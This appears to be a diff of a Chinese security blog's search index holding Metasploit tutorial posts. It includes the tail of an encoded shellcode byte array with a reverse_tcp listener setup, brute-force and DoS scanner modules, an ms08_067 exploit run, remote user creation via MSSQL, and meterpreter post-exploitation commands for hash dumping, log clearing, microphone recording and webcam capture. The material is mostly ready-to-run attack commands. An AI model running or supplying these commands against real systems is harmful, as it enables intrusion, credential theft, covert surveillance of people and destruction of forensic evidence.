&amp;H47&amp;H98&amp;HF4&amp;H6C&amp;H1F&amp;HCA&amp;H1A&amp;H0A&amp;H83&amp;H9B&amp;H48&amp;H2B&amp;H45&amp;H98&amp;H98&amp;H28&amp;H73&amp;H0A&amp;H0E&amp;HF0&amp;H6A&amp;HCF&amp;H2F&amp;H7B&amp;H22&amp;HFC&amp;H58&amp;H24&amp;H94&amp;H38&amp;H0C&amp;HC3&amp;H6E&amp;HD9&amp;HD8&amp;HB8&amp;H05&amp;H24&amp;H64&amp;H2C&amp;H35&amp;HE8&amp;H6A&amp;HD8&amp;HAE&amp;H35&amp;H8B&amp;H48&amp;HAA&amp;H12&amp;HF5&amp;H07&amp;H54&amp;H2D&amp;H65&amp;H4B&amp;H71&amp;H72&amp;H45&amp;H09&amp;H93&amp;HD1&amp;H4B&amp;H14&amp;H7B&amp;H9B&amp;H87&amp;HE1&amp;H28&amp;HDD&amp;H8C&amp;H2C&amp;H72&amp;HA1&amp;HA7&amp;H64&amp;H2D&amp;H72&amp;HE6&amp;H5A&amp;H37&amp;H79&amp;HBB&amp;H06&amp;H78&amp;H9B&amp;HC3&amp;H74&amp;H73&amp;H03&amp;HDB&amp;HDA&amp;H4C&amp;H32&amp;HED&amp;HAC&amp;H36&amp;HF3&amp;H64&amp;HA0&amp;H76&amp;HF2&amp;H78&amp;H10&amp;HB7&amp;H5C&amp;H44&amp;HA8&amp;H6B&amp;H1C&amp;HD7&amp;H33&amp;HB7&amp;HE6&amp;HBC&amp;HA4&amp;H0A&amp;H17&amp;H8E&amp;HB6&amp;H95&amp;H96&amp;H14&amp;H77&amp;H97&amp;HF4&amp;HD4&amp;H49&amp;H6B&amp;HD7&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00</span><br><span class="line">&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2C&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H54&amp;H30&amp;H00&amp;H00&amp;H38&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H9C&amp;H00&amp;H45&amp;H78&amp;H69&amp;H74&amp;H50&amp;H72&amp;H6F&amp;H63&amp;H65&amp;H73&amp;H73&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H4B&amp;H45&amp;H52&amp;H4E&amp;H45&amp;H4C&amp;H33&amp;H32&amp;H2E&amp;H64&amp;H6C&amp;H6C&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H7C&amp;HD1&amp;HFC&amp;H2D&amp;H5B&amp;HDE&amp;H92&amp;HE6&amp;HF4&amp;H19&amp;HCF&amp;HBD&amp;HB3&amp;H75&amp;H0F&amp;HC4&amp;HA8&amp;HBF&amp;H60&amp;H34&amp;H1C&amp;H96&amp;H14&amp;H72&amp;HE3&amp;HFE&amp;H61&amp;HED&amp;H46&amp;H58&amp;HD0&amp;H1C&amp;H3B&amp;H06&amp;HB2&amp;HEF&amp;H20&amp;H0D&amp;HAC&amp;H12&amp;HA7&amp;HFB&amp;HD9&amp;H92&amp;H67&amp;H86&amp;HB7&amp;H5B&amp;HB2&amp;H12&amp;HD1&amp;H03&amp;HDB&amp;HC5&amp;H54&amp;HA6&amp;H87&amp;H8A&amp;H8D&amp;H29&amp;H01</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>MsF启动侦听</strong></p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.190.175</li><li>exploit -j</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> deb后门 </tag>
+            
+            <tag> flash漏洞 </tag>
+            
+            <tag> 浏览器漏洞 </tag>
+            
+            <tag> android后门 </tag>
+            
+            <tag> 宏感染 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MsF漏洞扫描及加载常用扫描程序</title>
+      <link href="/2016/03/09/Exploits/MsF/MsF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F/"/>
+      <url>/2016/03/09/Exploits/MsF/MsF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F/</url>
+      
+        <content type="html"><![CDATA[<h4 id="MsF弱点扫描"><a href="#MsF弱点扫描" class="headerlink" title="MsF弱点扫描"></a><strong>MsF弱点扫描</strong></h4><ul><li>根据信息收集结果搜索漏洞利用模块</li><li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li><li>误判率,漏判率</li></ul><p><strong>VNC 密码破解</strong></p><pre><code>use auxiliary/scanner/vnc/vnc_login</code></pre><p><strong>VNC 无密码访问</strong></p><pre><code>use auxiliary/scanner/vnc/vnc_none_authsupported : None, free access!</code></pre><p><strong>RDP远程桌面漏洞</strong></p><pre><code>search ms12_020use auxiliary/scanner/rdp/ms12_020_check    #检查不会造成DoS攻击use auxiliary/dos/windows/rdp/ms12_020_maxchannelids    #DoS攻击模块</code></pre><p><strong>设备后门</strong></p><pre><code>use auxiliary/scanner/ssh/juniper_backdoor        #juniper防火墙后门use auxiliary/scanner/ssh/fortinet_backdoor</code></pre><p><strong>VMWare ESXi 密码爆破</strong></p><pre><code>use auxiliary/scanner/vmware/vmauthd_login        #爆破模块use auxiliary/scanner/vmware/vmware_enum_vms</code></pre><p><strong>利用Web API 远程开启虚拟机</strong></p><pre><code>use auxiliary/admin/vmware/poweron_vm        #管理模块</code></pre><h4 id="HTTP-弱点扫描"><a href="#HTTP-弱点扫描" class="headerlink" title="HTTP 弱点扫描"></a>HTTP 弱点扫描</h4><p><strong>扫描过期证书</strong></p><pre><code>use auxiliary/scanner/http/cert</code></pre><p><strong>扫描目录及文件</strong></p><pre><code>use auxiliary/scanner/http/dir_listing        #目录列表use auxiliary/scanner/http/files_dir        #扫文件</code></pre><p><strong>WebDAV Unicode 编码身份验证绕过</strong></p><pre><code>use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></pre><p><strong>Tomcat 管理登录</strong></p><pre><code>use auxiliary/scanner/http/tomcat_mgr_login</code></pre><p><strong>基于HTTP方法的身份验证绕过</strong></p><pre><code>use auxiliary/scanner/http/verb_auth_bypass</code></pre><p><strong>Wordpress密码破解</strong></p><pre><code>use auxiliary/scanner/http/wordpress_login_enum</code></pre><p><strong>WMAP WEB应用扫描器</strong></p><ul><li>根据SQLMAP的工作方式开发</li></ul><pre><code>load wmap    #msf 加载wmap插件wmap_sites -a http://1.1.1.1wmap_targets -t http://1.1.1.1/mutillidae/index.phpwmap_run -twmap_run -ewmap_vulns -lvulns</code></pre><p><strong>Openvas</strong></p><pre><code>load openvas        #命令行模式,需要配置,使用繁琐db_import openvas.nbe     #导入nbe格式扫描日志</code></pre><p><strong>Nessus</strong></p><pre><code>load nessusnessus_helpnessus_connect admin:toor@1.1.1.1nessus_policy_listnessus_scan_newnessus_report_list</code></pre><p><strong>Nexpose</strong></p><pre><code>导入xml格式日志文件</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> openvas </tag>
+            
+            <tag> nessus </tag>
+            
+            <tag> nexpose </tag>
+            
+            <tag> ms12_020 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>常用MSF信息收集辅助模块</title>
+      <link href="/2016/03/07/Exploits/MsF/%E5%B8%B8%E7%94%A8MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/"/>
+      <url>/2016/03/07/Exploits/MsF/%E5%B8%B8%E7%94%A8MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</url>
+      
+        <content type="html"><![CDATA[<h4 id="MSF信息收集"><a href="#MSF信息收集" class="headerlink" title="MSF信息收集"></a><strong>MSF信息收集</strong></h4><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a><strong>nmap扫描</strong></h5><pre><code>db_nmap -sV 192.168.1.0/24        #结果保存到msf数据库</code></pre><p><strong>auxiliary/scanner</strong> 辅助扫描模块</p><pre><code>RHOSTS &lt;&gt; RHOSTset RHOSTS 192.168.1.20-192.168.1.30set RHOSTS 192.168.1.0/24,192.168.11.0/24set RHOSTS file:/root/h.txtsearch arpuse auxiliary/scanner/discovery/arp_sweepset INTERFACE eth0 set RHOSTS 192.168.254.0/24    set SHOST            #源地址伪造set SMAC         set THREADS    20        #线程数runsearch portscanuse auxiliary/scanner/portscan/synset INTERFACEset PORTSset RHOSTSset THREADSrun</code></pre><h5 id="nmap-IPID-Idle扫描-扫描IPID递增且空闲的主机"><a href="#nmap-IPID-Idle扫描-扫描IPID递增且空闲的主机" class="headerlink" title="nmap IPID  Idle扫描 扫描IPID递增且空闲的主机"></a><strong>nmap IPID  Idle扫描</strong> 扫描IPID递增且空闲的主机</h5><ul><li>利用MSF查找ipidseq主机</li></ul><pre><code>use auxiliary/scanner/ip/ipidseqset rhosts 192.168.1.0/24runnmap -PN -sl 1.1.1.2 1.1.1.3</code></pre><h5 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a><strong>UDP扫描</strong></h5><pre><code>search udpuse auxiliary/scanner/discovery/udp_sweepuse auxiliary/scanner/discovery/udp_probe</code></pre><h5 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a><strong>密码嗅探</strong></h5><pre><code>search snifferuse auxiliary/sniffer/psnufflerun支持从pcap抓包文件中提取密码功能类似于dsniff目前只支持pop3,imap,ftp,HTTP GET协议</code></pre><h5 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a><strong>SNMP扫描</strong></h5><pre><code>vi /etc/default/snmpd            #侦听地址改为0.0.0.0use auxiliary/scanner/snmp/snmp_loginuse auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/snmp_enumusersuse auxiliary/scanner/snmp/snmp_enumshares</code></pre><h5 id="SMB版本扫描"><a href="#SMB版本扫描" class="headerlink" title="SMB版本扫描"></a><strong>SMB版本扫描</strong></h5><pre><code>#扫描版本信息    use auxiliary/scanner/smb/smb_version    #扫描命名管道,判断SMB服务类型(账号,密码)use auxiliary/scanner/smb/pipe_auditor#扫描通过SMB管道可以访问的RCERPC服务use auxiliary/scanner/smb/pipe_dcerpc_auditor#SMB共享枚举(账号,密码)use auxiliary/scanner/smb/smb_enumshares#SMB用户枚举(账号,密码)use auxiliary/scanner/smb/smb_enumusers#SID枚举(账号,密码)use auxiliary/scanner/smb/smb_lookupsid</code></pre><h5 id="SSH相关扫描模块"><a href="#SSH相关扫描模块" class="headerlink" title="SSH相关扫描模块"></a><strong>SSH相关扫描模块</strong></h5><pre><code>#SSH版本扫描use auxiliary/scanner/ssh/ssh_version#SSH密码爆破use auxiliary/scanner/ssh/ssh_loginset USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txtset VERBOSE falseexploit#SSH 公钥登录use auxiliary/scanner/ssh/ssh_login_pubkeyset KEY_FILE id_rsaset USERNAME rootrun</code></pre><h5 id="获取Windows缺少的系统补丁"><a href="#获取Windows缺少的系统补丁" class="headerlink" title="获取Windows缺少的系统补丁"></a><strong>获取Windows缺少的系统补丁</strong></h5><ul><li>基于已经取得的session进行检测</li></ul><pre><code>use post/windows/gather/enum_patchesshow advancedset session 1set VERBOSE yesrun</code></pre><p><strong>检查失败</strong></p><ul><li>Known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次尝试</li></ul><h5 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a><strong>SQL server</strong></h5><pre><code>#Mssql扫描端口#TCP 1433(动态端口) / UDP 1434 (查询TCP端口号)use auxiliary/scanner/mssql/mssql_ping#爆破mssql密码use auxiliary/scanner/mssql/mssql_login#远程执行代码use auxiliary/admin/mssql/mssql_execset CMD net user user pass /ADD</code></pre><h5 id="FTP模块"><a href="#FTP模块" class="headerlink" title="FTP模块"></a><strong>FTP模块</strong></h5><pre><code>#FTP版本扫描use auxiliary/scanner/ftp/ftp_version        #版本扫描use auxiliary/scanner/ftp/anonymous            #匿名登录扫描use auxiliary/scanner/ftp/ftp_login            #登录爆破use auxiliary/scanner/ [tab]    Display all 572 possibilities? (y or n)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 漏洞利用 </category>
+          
+          <category> MSF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MSF </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> sniffer </tag>
+            
+            <tag> auxiliary </tag>
+            
+            <tag> ssh密码爆破 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>meterpreter基本命令及其Python扩展</title>
-      <link href="/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
-      <url>/2016/03/06/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</url>
+      <link href="/2016/03/06/Exploits/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
+      <url>/2016/03/06/Exploits/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</url>
       
         <content type="html"><![CDATA[<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><strong>Meterpreter</strong></h4><p><strong>高级,动态,可扩展的payload</strong></p><ul><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul><p><strong>完全基于内存的DLL注入式payload</strong> (不写硬盘)</p><ul><li>注入合法系统进程并建立stager</li><li>基于Stager上传和预加载DLL进行扩展模块的注入(客户端API)</li><li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续扩展模块(避免网络取证)</li></ul><p><strong>服务端使用C语言编写</strong></p><ul><li>客户端提供基于ruby的全特性API(支持任何语言)</li></ul><h4 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a><strong>meterpreter基本命令</strong></h4><p><strong>以ms08_067漏洞测试获取一个meterpreter会话</strong></p><pre><code>msfconsolesearch 08-067use exploit/windows/smb/ms08_067_netapishow optionsset rhost 192.168.254.113set target 34set paylaod windows/meterpreter/reverse_tcpset lhsot 192.168.254.118set lport 6666exploit -j sessions -i 1</code></pre><p><strong>基本命令</strong></p><pre><code>help / ?        #查看使用帮助    background        #将meterpreter终端隐藏在后台（快捷键ctrl+z）sessions        #查看已经成功获得的会话，如果想继续与某会话交互，可以使用sessions -i 命令.quit / exit        #直接关闭当前的meterpreter会话，返回MSF终端.run                #执行meterpreter模块或脚本run post/windows/gather/hashdump    #获取目标机器hash密码bgrun            #后台执行meterpreter模块或脚本bgrun vnc        #VNC远程监控bgrun service_manager -l     #查看目标系统已有服务,可以创建自启动或开启停止服务.bglist            #提供所有正在运行的后台脚本的列表bgkill             #杀死一个背景 meterpreter 脚本channel         #显示活动频道interact         #与通道进行交互write             #将数据写入到一个通道read             #从通道读取数据close             #关闭通道use             #加载 meterpreter 的扩展clearev            #清除目标系统日志shell            #获取目标系统的控制台shell.resource -r r.txt    #调用资源文件ldletime        #查看目标机器空闲时间,判断电脑前是否有人record_mic        #录制目标麦克风,窃取声音信息webcam_list     #列出摄像头设备webcam_snap -i 1 -v false    #使用摄像头监控irb                #在meterpreter会话与ruby终端交互.load            #加载扩展插件</code></pre><p><strong>文件系统命令</strong></p><pre><code>cd            #访问目标文件夹路径pwd            #查看目标当前路径#攻击者本机命令前加l,意为local本地lcd         #访问攻击者本机路径lpwd        #查看攻击者本机路径ls / dir    #查看目标文件列表.cat            #查看目标文件内容.mkdir        #在目标机器创建目录.mv            #移动文件或改名getwd        #获得目标机器上当前的工作目录，getlwd，这个命令可以获得当前系统的工作目录.upload        #可以上传文件或文件夹到目标机器上;upload 要上传的文件 C:\Users\buzz\Desktopdownload    #从目标机器上下载文件或文件夹，注意windows路径要用双斜杠进行转义. download C:\\test.txt /root/home/testedit        #调用vi编辑器，对目标机器上的文件进行编辑;edit c:\\windows\\system32\\drivers\\etc\\hostssearch        #可通过search -h查看帮助信息,参数-d指定搜索的起始目录或驱动，如果为空，将进行全盘搜索；参数-f指定搜索的文件或部分文件名，支持星号(*)匹配；参数-r递归搜索子目录.search -d c:\\windows -f *.txtrm / del    #删除目标机器的文件.rmdir /s/q c:\\test    #进入shell后使用此命令可以删除目录下的所有文件和文件夹，/s表示所有子目录和文件/q表示安静模式，不显示yes or no.</code></pre><p><strong>网络命令</strong></p><pre><code>arp            #查看APR缓存netstat        #查看网络连接情况ifconfig    #查看目标机器网络接口信息portfwd        #它是meterpreter自带的端口转发器，用于把目标机器的端口转发到本地端口；假设目标机开放了3389端口，使用如下命令将其转发到本地3456端口：portfwd add -l 3456 -p 3389 -r 192.168.88.110rdesktop -u 用户名 -p 密码 ip:端口          #连接开启远程桌面的windows系统.route        #显示目标机器的路由信息.</code></pre><p><strong>系统命令</strong></p><pre><code>ps            #用于获得目标主机上正在运行的进程信息.migrate pid    #将Meterpreter会话从一个进程迁移到另一个进程的内存空间中，可以配合ps -ef |grep explorer.exeexecute        #在目标机器上执行文件.    execute -H -i -f cmd.exe         #直接与cmd进行交互,参数-H 表示隐藏执行 -i 表示直接与cmd交互.#另外execute命令的-m参数支持直接从内存中执行攻击者的可执行文件.execute -H -m -d regedit.exe -f hidden_shell.exegetprivs    #查看获取的权限getproxy    #获取代理信息getsystem    #获取系统权限getpid        #获得当前会话所在进程的PID值.kill        #用于终结指定的PID进程.getuid        #用于获得运行meterpreter会话的用户名，从而查看当前会话具有的权限.sysinfo        #用于得到目标系统的一些信息，例如机器名，操作系统等.show_mount    #展示已挂载磁盘reboot        #重启目标机器shutdown    #关闭目标机器</code></pre><h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a><strong>Meterpreter python扩展</strong></h4><ul><li>2015年11月份,来自社区的贡献</li><li>无需运行环境,在客户端运行原生python代码</li></ul><pre><code>load pythonhelppython_execute &quot;print(hello world)&quot;python_execute &quot;import os; cd=os.getcwd()&quot; -r cdpython_import -f find.py</code></pre>]]></content>
       
@@ -341,8 +703,8 @@
     
     <entry>
       <title>MSF生成和使用payload</title>
-      <link href="/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/"/>
-      <url>/2016/03/05/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/</url>
+      <link href="/2016/03/05/Exploits/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/"/>
+      <url>/2016/03/05/Exploits/MsF/MSF%E7%94%9F%E6%88%90%E5%92%8C%E4%BD%BF%E7%94%A8payload/</url>
       
